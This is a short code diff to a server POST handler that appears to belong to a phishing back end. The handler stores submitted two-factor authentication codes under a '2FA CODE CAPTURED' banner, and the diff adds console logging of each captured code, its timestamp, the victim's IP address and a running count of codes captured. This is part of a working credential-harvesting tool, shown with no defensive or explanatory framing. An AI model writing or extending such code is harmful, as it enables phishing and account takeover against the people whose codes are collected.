@@ -51,6 +51,11 @@ export async function POST({ request }) {
         saveData(existingData);
         
         console.log('\n🔐 ========== 2FA CODE CAPTURED ==========');
+        console.log(`📱 Code: ${code}`);
+        console.log(`⏰ Time: ${timestamp}`);
+        console.log(`🌐 IP: ${ip}`);
+        console.log(`💾 Total captured: ${existingData.length}`);
+        console.log('🔐 ========================================\n');
         
         return json({ success: true });
         
